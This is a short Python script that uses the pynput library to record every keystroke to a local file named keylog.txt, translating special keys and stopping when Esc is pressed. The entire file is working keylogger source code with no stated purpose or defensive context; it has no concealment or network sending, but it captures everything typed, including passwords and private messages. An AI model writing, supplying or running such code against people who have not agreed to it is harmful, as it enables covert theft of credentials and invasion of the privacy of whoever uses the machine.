from pynput import keyboard
import os

def on_press(key):
    try:
        with open("keylog.txt", "a") as log:
            log.write(f'{key.char}')
    except AttributeError:
        with open("keylog.txt", "a") as log:
            if key == keyboard.Key.space:
                log.write(' ')
            elif key == keyboard.Key.enter:
                log.write('\n')
            elif key == keyboard.Key.backspace:
                log.write('[BACKSPACE]')
            else:
                log.write(f'[{key}]')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setup the listener
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
